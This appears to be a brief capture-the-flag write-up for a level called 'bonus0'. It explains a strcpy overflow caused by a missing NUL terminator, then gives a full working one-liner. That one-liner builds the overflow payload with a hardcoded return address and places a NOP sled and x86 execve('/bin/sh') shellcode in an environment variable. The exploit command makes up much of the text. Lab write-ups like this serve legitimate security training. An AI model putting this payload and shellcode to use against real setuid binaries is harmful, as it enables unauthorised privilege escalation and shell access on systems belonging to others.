program read a 4096 buffer and keep the first twenty.  
we have to fill the first buffer to make the first stored buffer not contains his own NULL character.
this own will be remove by the strcpy on the other stored buffer.
this make the second buffer copied twice and let us insert address as return address.
just put a shellcode in environment variable and all done.

this payload will fill the first 4096 bytes, then it will put address to shellcode with the rights offsets:
```bash
cat <(python -c 'import sys,struct; sys.stdout.write("a"*20+"\x0a"*4076 + "a"*9+struct.pack("<I", 0xbffff7a2)+"a"*7+"\x0a")') - | env -i SHELLCODE=$(python -c 'import sys; sys.stdout.write("\x90"*2048 + "\x83\xc4\x18\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x6a\x17\x58\x31\xdb\xcd\x80\x6a\x2e\x58\x53\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80")') ./bonus0
```
